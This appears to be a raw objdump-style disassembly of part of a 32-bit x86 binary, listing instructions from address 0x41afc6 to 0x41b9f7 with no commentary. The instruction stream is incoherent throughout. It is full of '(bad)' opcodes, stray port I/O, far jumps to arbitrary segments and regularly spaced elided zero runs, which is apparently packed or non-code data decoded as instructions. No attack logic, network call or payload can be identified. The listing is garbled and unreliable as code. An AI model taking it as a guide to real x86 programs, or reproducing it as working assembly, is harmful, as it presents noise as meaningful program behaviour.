  41afc6:	bound  esi,QWORD PTR [ebx-0x53]
  41afc9:	cmc    
  41afca:	or     ecx,DWORD PTR [ebx+0x3f5a3862]
  41afd0:	jmp    0xb946:0x34aec7bb
  41afd7:	pop    ss
  41afd8:	retf   
  41afd9:	sbb    ecx,DWORD PTR [esi+edx*8-0x71512363]
  41afe0:	xchg   cl,ch
  41afe2:	(bad)  
  41afe3:	mov    ds:0x431a4072,eax
  41afe8:	add    BYTE PTR [esi],bl
  41afea:	jb     0x41afc0
  41afec:	into   
  41afed:	sbb    DWORD PTR [ebp+0x3b66fd8c],0x3b0d23f7
  41aff7:	mov    ds:0x3f49ad89,eax
  41affc:	cmp    DWORD PTR [edx],ebp
  41affe:	and    esp,DWORD PTR [edi]
  41b000:	and    al,0xa1
  41b002:	daa    
  41b003:	and    ch,cl
  41b005:	in     eax,0x12
  41b007:	daa    
  41b008:	and    al,0x91
  41b00a:	or     bl,BYTE PTR [edi]
  41b00c:	and    al,0xf1
  41b00e:	push   edx
  41b00f:	loope  0x41b035
  41b011:	in     eax,dx
	...
  41b03a:	add    BYTE PTR [eax],al
  41b03c:	cmp    eax,0xbaf0735b
  41b041:	leave  
  41b042:	sub    ch,ch
  41b044:	cmp    eax,0x3295005b
  41b049:	inc    esi
  41b04a:	add    ah,ch
  41b04c:	cmp    eax,0xbae47c5b
  41b051:	mov    BYTE PTR [edx],al
  41b053:	jge    0x41b078
  41b055:	or     bh,BYTE PTR [ebp+eax*8+0x15]
  41b059:	pop    ebx
  41b05a:	jnp    0x41b045
  41b05c:	cmp    eax,0x266a0307
  41b061:	pop    esp
  41b062:	je     0x41b05e
  41b064:	stos   BYTE PTR es:[edi],al
  41b065:	pop    ss
  41b066:	and    al,0x11
  41b068:	(bad)  
  41b069:	sbb    cl,BYTE PTR [ecx-0xe670a49]
  41b06f:	mov    esi,0x62307426
  41b074:	cmp    DWORD PTR [edi],0x3f416258
  41b07a:	adc    BYTE PTR [edx+0x12],dh
  41b07d:	xor    al,0xd5
  41b07f:	cmp    ecx,DWORD PTR [edx-0x2f7e312c]
  41b085:	mov    bh,ch
  41b087:	mov    ss,esi
  41b089:	push   ds
  41b08a:	and    al,0x0
  41b08c:	neg    esi
  41b08e:	jmp    0x41b091
  41b090:	retf   0xe77b
  41b093:	adc    bl,BYTE PTR [edx+ebx*1+0x24]
  41b097:	adc    BYTE PTR [edx+0x47],ah
  41b09a:	sti    
  41b09b:	push   ecx
  41b09c:	cmc    
  41b09d:	push   es
  41b09e:	into   
  41b09f:	call   0x41b0a4
	...
  41b0c8:	add    BYTE PTR [eax],al
  41b0ca:	xor    eax,0x44fffb8e
  41b0cf:	je     0x41b150
  41b0d1:	std    
  41b0d2:	xchg   esp,eax
  41b0d3:	or     BYTE PTR [ecx+eax*4-0x74ffa259],0x19
  41b0db:	pop    edx
  41b0dc:	add    al,0x0
  41b0de:	xchg   edi,eax
  41b0df:	sbb    BYTE PTR [edi+0x50],cl
  41b0e2:	sbb    al,0xc4
  41b0e4:	call   0xfbb50807
  41b0e9:	mov    esp,DWORD PTR [ebx-0x59aad797]
  41b0ef:	push   es
  41b0f0:	into   
  41b0f1:	mov    ebp,DWORD PTR [edi]
  41b0f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0f4:	lock repnz inc eax
  41b0f7:	jae    0x41b130
  41b0f9:	ret    
  41b0fa:	shl    BYTE PTR [ebp-0x79],1
  41b0fd:	inc    esp
  41b0fe:	jnp    0x41b165
  41b100:	aaa    
  41b101:	xchg   BYTE PTR [ebx-0x77],bh
  41b104:	std    
  41b105:	call   FWORD PTR [edx+0x4fbe8086]
  41b10b:	pop    ebx
  41b10c:	add    BYTE PTR [eax],al
  41b10e:	pop    ss
  41b10f:	stc    
  41b110:	inc    eax
  41b111:	cmp    eax,0x5c17
  41b116:	sbb    DWORD PTR [edx+0x7f],0xfffffffd
  41b11a:	and    eax,0x173d02f9
  41b11f:	hlt    
  41b120:	(bad)  
  41b121:	call   DWORD PTR [ebx+0x4d]
  41b124:	xchg   DWORD PTR [ebx+ecx*1+0x15],ebx
  41b128:	test   DWORD PTR [ebx+edi*8+0x58],ebp
  41b12c:	sub    ebp,0x0
	...
  41b156:	add    BYTE PTR [eax],al
  41b158:	ds data16 and al,0x89
  41b15c:	enter  0xfd8e,0xff
  41b160:	fldenv [ebp+0x52]
  41b163:	mov    DWORD PTR [eax],eax
  41b165:	jmp    0x41b18a
  41b167:	lock leave 
  41b169:	adc    DWORD PTR [edi+edi*8-0xfe8d3f],ebp
  41b170:	ret    
  41b171:	xchg   ch,bh
  41b173:	push   DWORD PTR [ecx+0x5224406b]
  41b179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b17a:	loope  0x41b107
  41b17c:	add    dh,BYTE PTR [edi-0x1a]
  41b17f:	jmp    0x2489be78
  41b184:	test   BYTE PTR [eax+eax*2],0x24
  41b188:	push   esi
  41b189:	out    0x51,eax
  41b18b:	mov    DWORD PTR [eax+0x1a],esi
  41b18e:	add    ecx,esi
  41b190:	jns    0x41b1d3
  41b192:	add    ebp,DWORD PTR [esi+0x17e4a]
  41b198:	mov    ebx,0x55fd08ce
  41b19d:	xchg   edi,eax
  41b19e:	jp     0x41b1fc
  41b1a0:	and    bh,BYTE PTR [edx-0x50340280]
  41b1a6:	jp     0x41b1f4
  41b1a8:	and    bl,BYTE PTR [edx+0x7e2a967a]
  41b1ae:	add    DWORD PTR [eax],eax
  41b1b0:	(bad)  
  41b1b1:	sub    eax,0x35c73c20
  41b1b6:	and    BYTE PTR [eax],bh
  41b1b8:	mov    bh,0x45
  41b1ba:	and    BYTE PTR [eax],dl
	...
  41b1e4:	add    BYTE PTR [eax],al
  41b1e6:	jns    0x41b185
  41b1e8:	or     eax,DWORD PTR [ebx+0x45014619]
  41b1ee:	and    eax,0x32867a79
  41b1f3:	jbe    0x41b1f6
  41b1f5:	add    BYTE PTR [ebp+0x62],ch
  41b1f8:	jns    0x41b1c8
  41b1fa:	out    0x5a,al
  41b1fc:	pop    ebp
  41b1fd:	(bad)  
  41b1fe:	xrelease xchg DWORD PTR [esi-0x18a0ad83],ebx
  41b205:	add    edi,DWORD PTR [ebp-0x18802179]
  41b20b:	pop    edx
  41b20c:	out    0x3,eax
  41b20e:	pop    ss
  41b20f:	pop    es
  41b210:	ret    
  41b211:	daa    
  41b212:	cmp    ebx,esi
  41b214:	mov    BYTE PTR [ebx],al
  41b216:	ds pop ebx
  41b218:	bound  ecx,QWORD PTR [edi+0x62]
  41b21b:	das    
  41b21c:	jb     0x41b1d4
  41b21e:	addr16 xchg esp,eax
  41b220:	ins    BYTE PTR es:[edi],dx
  41b221:	push   DWORD PTR [edi]
  41b223:	inc    esp
  41b224:	cs ins DWORD PTR es:[edi],dx
  41b226:	cmp    al,0xd4
  41b228:	es push ebx
  41b22a:	(bad)  
  41b22b:	push   ds
  41b22c:	or     edx,DWORD PTR [eax]
  41b22e:	(bad)  
  41b22f:	jae    0x41b243
  41b231:	xlat   BYTE PTR ds:[ebx]
  41b232:	in     eax,dx
  41b233:	sub    ah,BYTE PTR [edi+esi*1+0x5a]
  41b237:	inc    edi
  41b238:	cwde   
  41b239:	jp     0x41b1c3
  41b23b:	rcl    DWORD PTR [ebx-0x6a8ce5e1],1
  41b241:	lock imul eax,DWORD PTR [edi+0x4f1a67d0],0xffffff99
  41b249:	das    
	...
  41b272:	add    BYTE PTR [eax],al
  41b274:	(bad)  
  41b275:	cs retf 
  41b277:	xor    ebp,ebx
  41b279:	sub    al,0x72
  41b27b:	mov    ch,0x56
  41b27d:	jg     0x41b277
  41b27f:	in     eax,0x43
  41b281:	sar    edi,cl
  41b283:	jns    0x41b207
  41b285:	aas    
  41b286:	pop    ds
  41b287:	dec    ebp
  41b288:	mov    ss,edx
  41b28a:	lods   eax,DWORD PTR ds:[esi]
  41b28b:	fadd   QWORD PTR [esi]
  41b28d:	(bad)  
  41b28e:	(bad)  
  41b28f:	in     eax,0x67
  41b291:	mov    al,ds:0x6f625862
  41b296:	inc    ebp
  41b297:	adc    al,0xc7
  41b299:	pop    ss
  41b29a:	add    esi,DWORD PTR [edi+esi*4]
  41b29d:	das    
  41b29e:	add    BYTE PTR ds:0x54cde4e,cl
  41b2a4:	sub    bl,dh
  41b2a6:	push   esp
  41b2a7:	int    0x19
  41b2a9:	aam    0x44
  41b2ab:	lds    ecx,FWORD PTR [ebp+0x30]
  41b2ae:	push   ebx
  41b2af:	cmp    DWORD PTR [edi-0x6b],esp
  41b2b2:	call   0xfdcaa36f
  41b2b7:	jb     0x41b2cf
  41b2b9:	aas    
  41b2ba:	cmp    BYTE PTR [esi],dl
  41b2bc:	ins    DWORD PTR es:[edi],dx
  41b2bd:	aam    0xce
  41b2bf:	(bad)  
  41b2c1:	jae    0x41b264
  41b2c3:	js     0x41b268
  41b2c5:	mov    BYTE PTR [ecx],bh
  41b2c7:	sub    al,0x19
  41b2c9:	inc    ecx
  41b2ca:	mov    DWORD PTR [ebp+0x6f394349],esp
  41b2d0:	pop    esi
  41b2d1:	pop    edi
  41b2d2:	add    cl,ch
  41b2d4:	sub    BYTE PTR [esi-0x7f],bl
  41b2d7:	xchg   DWORD PTR [eax],eax
	...
  41b301:	add    BYTE PTR [edx],dh
  41b303:	pop    edi
  41b304:	add    cl,ch
  41b306:	cmp    eax,0x3df4180f
  41b30b:	pop    edx
  41b30c:	add    cl,ch
  41b30e:	loope  0x41b369
  41b310:	and    DWORD PTR [esi],0xdc170f3c
  41b316:	cmp    eax,0xd9e90002
  41b31b:	pop    ecx
  41b31c:	or     DWORD PTR [esi],0x9e0b0f3f
  41b322:	in     eax,dx
  41b323:	ror    esi,cl
  41b325:	adc    DWORD PTR [edi+0x76],esp
  41b328:	std    
  41b329:	test   BYTE PTR [esi],0x88
  41b32c:	jmp    0x243969fa
  41b331:	stc    
  41b332:	xor    BYTE PTR [esi-0x2bc21603],al
  41b338:	rol    DWORD PTR [edx],1
  41b33a:	repz sub BYTE PTR [ebx+0x62],dl
  41b33e:	shl    DWORD PTR [edx-0x3b],cl
  41b341:	add    cl,ch
  41b343:	jle    0x41b340
  41b345:	inc    ebp
  41b346:	xchg   esp,eax
  41b347:	scas   eax,DWORD PTR es:[edi]
  41b348:	std    
  41b349:	je     0x41b345
  41b34b:	add    BYTE PTR [esp+0x17],ch
  41b34f:	add    eax,DWORD PTR [esp+0x33]
  41b353:	sbb    al,0x48
  41b355:	mov    DWORD PTR [ebx],ebp
  41b357:	cmp    ebx,DWORD PTR [eax+0x3b]
  41b35a:	scas   eax,DWORD PTR es:[edi]
  41b35b:	mov    ?,WORD PTR [edi-0x49]
  41b35e:	scas   eax,DWORD PTR es:[edi]
  41b35f:	jle    0x41b35c
  41b361:	test   DWORD PTR [eax+0x9c818e],edi
	...
  41b38f:	add    bh,dl
  41b391:	pop    ecx
  41b392:	add    BYTE PTR [ebx-0x79f4a6b8],al
  41b398:	and    al,0x5a
  41b39a:	add    BYTE PTR [eax],al
  41b39c:	sub    al,0x4e
  41b39e:	and    al,0x10
  41b3a0:	lock add bh,BYTE PTR [edi+0x4d2a502b]
  41b3a7:	mov    edi,DWORD PTR [ecx]
  41b3a9:	mov    ds:0x7ef8ee2b,al
  41b3ae:	xchg   DWORD PTR [ebx+eax*2+0x37],edx
  41b3b2:	push   ebx
  41b3b3:	push   edx
  41b3b4:	sbb    al,0xd0
  41b3b6:	xchg   eax,ebp
  41b3b8:	call   FWORD PTR [eax-0x13]
  41b3bb:	call   FWORD PTR [eax]
  41b3bd:	xor    eax,ecx
  41b3bf:	jg     0x41b363
  41b3c1:	add    al,BYTE PTR [esp-0x71]
  41b3c5:	xor    al,BYTE PTR [esi+0x596324]
  41b3cb:	jne    0x41b41b
  41b3cd:	fidivr DWORD PTR [esi+0x596328]
  41b3d3:	add    bl,al
  41b3d5:	push   ecx
  41b3d6:	cmp    DWORD PTR [eax],eax
  41b3d8:	and    bl,BYTE PTR [ecx+0x0]
  41b3db:	jl     0x41b3ff
  41b3dd:	fdivp  st(3),st
  41b3df:	add    dl,BYTE PTR [ebx+0x3e003933]
  41b3e5:	das    
  41b3e6:	add    al,0x0
  41b3e8:	call   0xfc46:0x3dfd867f
  41b3ef:	push   esp
  41b3f0:	outs   dx,BYTE PTR ds:[esi]
  41b3f1:	or     edx,edx
  41b3f3:	call   0x41b3f8
	...
  41b41c:	add    BYTE PTR [eax],al
  41b41e:	ja     0x41b3e3
  41b420:	loope  0x41b41f
  41b422:	in     eax,0x8c
  41b424:	inc    eax
  41b425:	pop    ecx
  41b426:	xchg   ecx,eax
  41b427:	icebp  
  41b428:	retf   
  41b429:	std    
  41b42a:	mov    cl,dh
  41b42c:	(bad)  
  41b42d:	cmp    ah,bh
  41b42f:	mov    al,BYTE PTR [ecx]
  41b431:	mov    DWORD PTR [edx-0x62],ebp
  41b434:	icebp  
  41b435:	mov    ch,bh
  41b437:	test   eax,0x97350ca
  41b43c:	shr    al,cl
  41b43e:	and    esp,ebx
  41b440:	loope  0x41b43f
  41b442:	add    esi,ecx
  41b444:	lock jmp FWORD PTR [edx]
  41b447:	das    
  41b448:	in     eax,dx
  41b449:	adc    BYTE PTR [ebp-0x4cefda32],dh
  41b44f:	mov    ecx,0xf8ec4fe2
  41b454:	shr    eax,1
  41b456:	cmp    DWORD PTR [ecx+eiz*8],ebp
  41b459:	std    
  41b45a:	mov    ch,0xc6
  41b45c:	and    eax,0x173c354
  41b461:	add    BYTE PTR [esi],bh
  41b463:	mov    edx,eax
  41b465:	jno    0x41b486
  41b467:	(bad)  
  41b469:	add    BYTE PTR [esi],bh
  41b46b:	jb     0x41b46e
  41b46d:	mov    DWORD PTR [eax+0x3e000586],edi
  41b473:	shl    DWORD PTR [ecx],0x89
  41b476:	sub    BYTE PTR [edx-0x19],0xeb
  41b47a:	dec    ecx
  41b47b:	test   DWORD PTR [esi+ebp*4],eax
  41b47e:	sub    dh,BYTE PTR [esi+0x1]
	...
  41b4a9:	add    BYTE PTR [eax],al
  41b4ab:	add    BYTE PTR ds:0xacdd1d57,bh
  41b4b1:	pop    ebx
  41b4b2:	int3   
  41b4b3:	xchg   bh,dh
  41b4b5:	sub    eax,0xffffff81
  41b4b8:	inc    edx
  41b4b9:	pop    edi
  41b4ba:	out    0x3,eax
  41b4bc:	lds    ecx,FWORD PTR [edi]
  41b4be:	loopne 0x41b518
  41b4c0:	sub    eax,edx
  41b4c2:	ins    DWORD PTR es:[edi],dx
  41b4c3:	repz cmp eax,0xb88ce75b
  41b4c9:	(bad)  
  41b4ca:	jmp    0x41b4cf
  41b4cc:	sbb    esp,DWORD PTR ds:[eax-0x6f]
  41b4d0:	push   edx
  41b4d1:	pop    edi
  41b4d2:	out    0x3,eax
  41b4d4:	rcr    esp,0xf7
  41b4d7:	pop    es
  41b4d8:	ds pop ebx
  41b4da:	bound  ecx,QWORD PTR [ecx+0x3e75f36]
  41b4e0:	les    ebp,FWORD PTR [edx-0x17]
  41b4e3:	mov    ch,0xc8
  41b4e5:	cwde   
  41b4e6:	outs   dx,DWORD PTR ds:[esi]
  41b4e7:	repz shl ch,0xd3
  41b4eb:	pop    es
  41b4ec:	ds pop ebx
  41b4ee:	hlt    
  41b4ef:	cld    
  41b4f0:	(bad)  
  41b4f1:	fdivr  st(7),st
  41b4f3:	pop    es
  41b4f4:	ds pop ebx
  41b4f6:	jo     0x41b481
  41b4f8:	inc    esi
  41b4f9:	pop    edi
  41b4fa:	out    0x3,eax
  41b4fc:	(bad)  
  41b4fd:	rcr    DWORD PTR [ebp-0x1],1
  41b500:	cmp    eax,0xc08ce75b
  41b505:	push   0xffffffe3
  41b507:	add    edi,DWORD PTR [esi]
  41b509:	shr    BYTE PTR [ebp-0x5],1
  41b50c:	cmp    eax,0x8de75b
	...
  41b539:	add    BYTE PTR [esi+0x59],cl
  41b53c:	cmp    ecx,esp
  41b53e:	jl     0x41b512
  41b540:	test   DWORD PTR [eax+eax*8],0x3e03eb66
  41b547:	push   cs
  41b548:	lock mov ?,WORD PTR [eax+0x3e03eb6a]
  41b54f:	shl    BYTE PTR [ebp-0x5],cl
  41b552:	cmp    eax,0x7de9005b
  41b557:	fimul  DWORD PTR [esi+0x5b39cd]
  41b55d:	jo     0x41b513
  41b55f:	imul   eax,DWORD PTR [ecx+ebp*8],0x3d
  41b563:	aam    0x86
  41b565:	icebp  
  41b566:	inc    ecx
  41b567:	pop    ebx
  41b568:	add    BYTE PTR [ecx-0x26792ba6],bh
  41b56e:	inc    ecx
  41b56f:	pop    ebx
  41b570:	add    BYTE PTR [edi+0x67895b3a],ah
  41b576:	ds push edi
  41b578:	add    cl,ch
  41b57a:	ret    0x18d9
  41b57d:	in     eax,dx
  41b57e:	cmp    eax,0xea4eff5b
  41b583:	pop    esi
  41b584:	add    cl,ch
  41b586:	sub    dl,BYTE PTR [esi+0x17c2c9d2]
  41b58c:	and    al,0x25
  41b58e:	rcr    DWORD PTR [ebx+0xfb2b874],0x24
  41b595:	or     ebx,ecx
  41b597:	jmp    0x5b7f9aac
  41b59c:	sub    DWORD PTR [ebp+0x0],edi
	...
  41b5c6:	add    BYTE PTR [eax],al
  41b5c8:	popa   
  41b5c9:	sub    ecx,DWORD PTR [edi+0x72]
  41b5cc:	int3   
  41b5cd:	addr16 add al,0xe9
  41b5d0:	cmp    eax,0x4a054c34
  41b5d5:	sub    eax,0xab9e9e4f
  41b5da:	and    DWORD PTR ds:0xbcc0dd8a,0x2a892649
  41b5e4:	xor    esp,DWORD PTR [eax]
  41b5e6:	pop    esi
  41b5e7:	push   0x76
  41b5e9:	inc    ebx
  41b5ea:	ret    0x3a01
  41b5ed:	aam    0x86
  41b5ef:	stc    
  41b5f0:	inc    ecx
  41b5f1:	pop    ebx
  41b5f2:	add    dl,al
  41b5f4:	stc    
  41b5f5:	ss push eax
  41b5f7:	add    BYTE PTR [edx-0x2ba1a4c1],ah
  41b5fd:	xchg   edx,eax
  41b5fe:	cmp    dl,al
  41b600:	divps  xmm7,XMMWORD PTR [eax+0x502700]
  41b607:	ret    
  41b608:	lods   al,BYTE PTR ds:[esi]
  41b609:	sbb    ah,BYTE PTR [esp+eax*1]
  41b60c:	lods   al,BYTE PTR ds:[esi]
  41b60d:	xchg   esi,eax
  41b60e:	mov    ebp,0x44d124e9
  41b613:	or     BYTE PTR [edi-0x68],ah
  41b616:	xchg   DWORD PTR [ebx+edi*1+0x6b],eax
  41b61a:	jge    0x41b608
  41b61c:	xor    edx,DWORD PTR [ebx+0x0]
  41b61f:	add    BYTE PTR [edx-0x62],ch
  41b622:	jno    0x41b62b
  41b624:	call   0x5dd7:0x42c
  41b62a:	mov    edi,0x8b
	...
  41b653:	add    BYTE PTR [eax],al
  41b655:	add    BYTE PTR [ebx+0x3a],dl
  41b658:	inc    esp
  41b659:	add    al,0xe7
  41b65b:	pop    ebp
  41b65c:	xchg   DWORD PTR [ebx+edi*8-0x28fffbe3],edx
  41b663:	dec    esp
  41b664:	xchg   DWORD PTR [ebx+edi*8-0x58fffbe3],ecx
  41b66b:	inc    edi
  41b66c:	xchg   DWORD PTR [ebx+edi*2-0x68fffb9f],edx
  41b673:	dec    esp
  41b674:	push   eax
  41b675:	mov    ebx,DWORD PTR [ebx]
  41b677:	cmp    al,BYTE PTR [eax+0x4]
  41b67a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b67b:	pop    ebp
  41b67c:	push   edx
  41b67d:	push   eax
  41b67e:	repnz adc DWORD PTR [eax+ebx*1],esp
  41b682:	out    dx,eax
  41b683:	dec    ebp
  41b684:	icebp  
  41b685:	inc    DWORD PTR [eax-0x23]
  41b688:	les    ebp,FWORD PTR [ebx+ebp*2]
  41b68b:	pop    ebp
  41b68c:	add    bl,al
  41b68e:	push   ebx
  41b68f:	xchg   edx,eax
  41b690:	int3   
  41b691:	int3   
  41b692:	xor    edx,DWORD PTR [edx-0x6dec3334]
  41b698:	int3   
  41b699:	int3   
  41b69a:	ds mov edi,0x7fbfe38a
  41b6a0:	rol    BYTE PTR [eax],cl
  41b6a2:	ds je  0x41b6d9
  41b6a5:	push   esi
  41b6a6:	jmp    0x6f49ecb7
  41b6ab:	ins    DWORD PTR es:[edi],dx
  41b6ac:	adc    BYTE PTR [esi+0x3f56feed],dh
  41b6b2:	ds or  edx,esp
  41b6b5:	mov    edi,0xb60e7626
	...
  41b6e2:	add    BYTE PTR [eax],al
  41b6e4:	inc    edx
  41b6e5:	or     BYTE PTR [edi+ebp*8+0xd0593bd],0xd1
  41b6ed:	push   es
  41b6ee:	or     edi,esp
  41b6f0:	mov    esi,DWORD PTR [ebx]
  41b6f2:	add    al,0x83
  41b6f4:	push   es
  41b6f5:	jp     0x41b76f
  41b6f7:	iret   
  41b6f8:	inc    ecx
  41b6f9:	or     bl,al
  41b6fb:	mov    BYTE PTR [edx-0x42be33a9],al
  41b701:	mov    ebp,0xa3ef7c1c
  41b706:	scas   eax,DWORD PTR es:[edi]
  41b707:	mov    bp,0x104f
  41b70b:	call   DWORD PTR [edx-0x74]
  41b70e:	mov    eax,ss
  41b710:	leave  
  41b711:	mov    edx,0xa83e4c8f
  41b716:	jmp    0x278a:0xef9ec301
  41b71d:	jae    0x41b6a1
  41b71f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b720:	jecxz  0x41b6a4
  41b722:	fdivp  st(5),st
  41b724:	cdq    
  41b725:	jb     0x41b6a9
  41b727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b728:	ret    
  41b729:	sbb    dh,0xfd
  41b72c:	mov    DWORD PTR [edx+0x14],esi
  41b72f:	fnstenv [ecx]
  41b731:	or     BYTE PTR [edx+0x1b2f0a4],al
  41b737:	mov    ebp,DWORD PTR [edx]
  41b739:	stos   BYTE PTR es:[edi],al
  41b73a:	cmp    dh,0x4a
  41b73d:	pop    ebx
  41b73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b73f:	or     DWORD PTR [edi+edx*1+0x17c6cbd4],esi
  41b746:	hlt    
  41b747:	jae    0x41b749
	...
  41b771:	add    BYTE PTR [edi+0x53],ah
  41b774:	popa   
  41b775:	dec    eax
  41b776:	or     eax,0x25486faf
  41b77b:	jmp    0x41b727
  41b77d:	xor    BYTE PTR [edi],0x5f
  41b780:	jae    0x41b73e
  41b782:	neg    DWORD PTR [esi-0x19]
  41b785:	add    edi,DWORD PTR [esi]
  41b787:	push   eax
  41b788:	popf   
  41b789:	sbb    edx,0xc5042808
  41b78f:	inc    esi
  41b790:	out    dx,eax
  41b791:	adc    BYTE PTR [eax],0x43
  41b794:	dec    esp
  41b795:	or     dh,BYTE PTR [esi+edx*1+0x16b6cbfc]
  41b79c:	fdiv   QWORD PTR [ebx-0x19]
  41b79f:	push   edx
  41b7a0:	popa   
  41b7a1:	inc    edi
  41b7a2:	sub    eax,0x45475faf
  41b7a7:	jmp    0x41b7d3
  41b7a9:	and    edi,0x42
  41b7ac:	sbb    edi,DWORD PTR [ebp-0x6a195bd7]
  41b7b2:	mov    edi,0x3e4515c6
  41b7b7:	fild   DWORD PTR [ebx]
  41b7b9:	or     DWORD PTR [esi-0x38f20ca6],ebp
  41b7bf:	push   esi
  41b7c0:	push   esp
  41b7c1:	movaps xmm3,XMMWORD PTR [edx]
  41b7c4:	out    0xc,eax
  41b7c6:	ret    0xf7cd
  41b7c9:	fisub  WORD PTR [ebx-0x406a1181]
  41b7cf:	mov    ds,ebp
  41b7d1:	inc    esp
  41b7d2:	ds fcmovne st,st(3)
  41b7d5:	or     BYTE PTR [eax],al
	...
  41b7ff:	add    BYTE PTR [esi-0x48f244a6],ch
  41b805:	push   esi
  41b806:	pop    esp
  41b807:	(bad)  
  41b809:	sbb    DWORD PTR [eax],eax
  41b80b:	jmp    0xd9fd8f52
  41b810:	mov    BYTE PTR [ebp-0x3],bh
  41b813:	stos   BYTE PTR es:[edi],al
  41b814:	mov    esp,0x7f9d1881
  41b819:	sbb    al,0x81
  41b81b:	adc    ecx,DWORD PTR [ebp+0x4e]
  41b81e:	mov    ebx,ss
  41b820:	push   0xb674fd7d
  41b825:	push   0xfffffffd
  41b827:	(bad)  
  41b828:	sbb    ebp,DWORD PTR [eax+ebp*8]
  41b82b:	loopne 0x41b86a
  41b82d:	pop    ebx
  41b82e:	add    BYTE PTR [esi-0x2a78db95],cl
  41b834:	popa   
  41b835:	cdq    
  41b836:	or     cl,ch
  41b838:	push   eax
  41b839:	(bad)  
  41b83a:	jecxz  0x41b8a4
  41b83c:	push   cs
  41b83d:	fadd   QWORD PTR [eax]
  41b83f:	jmp    0x1e97e481
  41b844:	mov    bh,0x1a
  41b846:	or     BYTE PTR [ecx+esi*1-0x25],ch
  41b84a:	mov    bh,0xd9
  41b84c:	cmp    eax,0xff60005b
  41b851:	fadd   st(0),st
  41b853:	in     eax,dx
  41b854:	mov    dh,0x4c
  41b856:	jg     0x41b7df
  41b858:	inc    edx
  41b859:	pop    ebx
  41b85a:	cld    
  41b85b:	jmp    0x62482e5c
  41b860:	daa    
  41b861:	(bad)  
  41b862:	in     al,0xa9
	...
  41b88c:	add    BYTE PTR [eax],al
  41b88e:	xor    ebx,DWORD PTR [ebx+0x0]
  41b891:	test   al,0xa3
  41b893:	push   ecx
  41b894:	pop    es
  41b895:	ja     0x41b85e
  41b897:	inc    ebx
  41b898:	jg     0x41b820
  41b89a:	inc    edx
  41b89b:	pop    ebx
  41b89c:	cld    
  41b89d:	jmp    0xf04c291e
  41b8a2:	jnp    0x41b87a
  41b8a4:	xor    ah,BYTE PTR [eax-0x38]
  41b8a7:	fadd   st(2),st
  41b8a9:	in     eax,0xb6
  41b8ab:	inc    ebx
  41b8ac:	jg     0x41b8ae
  41b8ae:	lock xchg esi,eax
  41b8b0:	or     eax,DWORD PTR [eax]
  41b8b2:	addr16 cdq 
  41b8b4:	jmp    0x41b8bc
  41b8b6:	pop    esp
  41b8b7:	pusha  
  41b8b8:	test   DWORD PTR [esi],edi
  41b8ba:	fsubr  QWORD PTR [ebx+0x7d]
  41b8bd:	out    0x57,al
  41b8bf:	stos   BYTE PTR es:[edi],al
  41b8c0:	(bad)  
  41b8c1:	jmp    DWORD PTR [esi]
  41b8c3:	jne    0x41b8d1
  41b8c5:	mov    ecx,DWORD PTR [ebx+ebx*8-0x21]
  41b8c9:	aas    
  41b8ca:	push   ss
  41b8cb:	jl     0x41b8dd
  41b8cd:	or     DWORD PTR [ecx],ebx
  41b8cf:	aam    0x18
  41b8d1:	add    DWORD PTR [edi+edx*2-0x10],0xe7992703
  41b8d9:	add    al,0x1e
  41b8db:	rol    BYTE PTR [ebp+0x7fcbae32],0xc2
  41b8e2:	and    edx,ebx
  41b8e4:	xor    BYTE PTR [ebx+0x33075f01],al
  41b8ea:	sahf   
  41b8eb:	imul   eax,DWORD PTR [ebp-0x7d],0xffffffd7
  41b8ef:	push   ebp
  41b8f0:	or     ecx,0x0
	...
  41b91a:	add    BYTE PTR [eax],al
  41b91c:	xor    dl,ch
  41b91e:	mov    DWORD PTR [ebp+0x67],eax
  41b921:	dec    edx
  41b922:	call   0x9b904e
  41b927:	pop    edi
  41b928:	jns    0x41b96e
  41b92a:	test   esp,ebp
  41b92c:	sbb    bl,BYTE PTR [ecx+0x165c0004]
  41b932:	and    al,0x4
  41b934:	ins    DWORD PTR es:[edi],dx
  41b935:	div    BYTE PTR [ebx+0x41]
  41b938:	xlat   BYTE PTR ds:[ebx]
  41b939:	ror    BYTE PTR [edx],cl
  41b93b:	mov    DWORD PTR [edi+0x2404c2da],ebp
  41b941:	call   0x4174:0x762d8104
  41b948:	xchg   edi,eax
  41b949:	sub    ebp,esi
  41b94b:	ret    0x59a3
  41b94e:	xchg   DWORD PTR [esi+edi*1+0x50],eax
  41b952:	or     BYTE PTR [edx+0x42a822],bh
  41b958:	mov    ch,0x8b
  41b95a:	mov    cl,BYTE PTR [edx]
  41b95c:	mov    ebp,0x7c810533
  41b961:	outs   dx,DWORD PTR ds:[esi]
  41b962:	cmp    dl,0x62
  41b965:	mov    DWORD PTR [edx+0x0],0x4bf65ec
  41b96c:	ds (bad) 
  41b96e:	mov    ah,bl
  41b970:	out    dx,al
  41b971:	ret    
  41b972:	xor    BYTE PTR [ecx+0x5b887c03],cl
  41b978:	xor    al,BYTE PTR [edi]
  41b97a:	ss clc 
  41b97c:	mov    edx,fs
  41b97e:	jmp    0x41b9a0
	...
  41b9a7:	add    BYTE PTR [eax],al
  41b9a9:	add    BYTE PTR [esi],bh
  41b9ab:	jb     0x41b9ae
  41b9ad:	push   0x4206a2
  41b9b2:	mov    bl,0x2f
  41b9b4:	fcom   QWORD PTR [eax+0x26]
  41b9b7:	int3   
  41b9b8:	add    al,0x0
  41b9ba:	ds inc ecx
  41b9bc:	xchg   DWORD PTR [ebx+0x6],eax
  41b9bf:	inc    ebx
  41b9c0:	in     al,dx
  41b9c1:	jo     0x41ba01
  41b9c3:	jb     0x41b9c6
  41b9c5:	pop    ecx
  41b9c6:	(bad)  
  41b9c7:	mov    ?,WORD PTR [edi]
  41b9c9:	ret    0x7246
  41b9cc:	mov    DWORD PTR ss:[edx-0x7576f3aa],eax
  41b9d3:	mov    es,WORD PTR ds:0x932ff87
  41b9d9:	mov    dh,0x47
  41b9db:	mov    bl,0xe3
  41b9dd:	sbb    BYTE PTR [edi+0x7ebf8c78],dh
  41b9e3:	test   DWORD PTR [edi-0xb2c80f9],ecx
  41b9e9:	or     BYTE PTR [ebx+edi*8+0xd],al
  41b9ed:	xchg   DWORD PTR [edi+0x32],edi
  41b9f0:	or     DWORD PTR [esi-0x1ad7a4c9],esi
  41b9f6:	inc    esi
  41b9f7:	push   eax
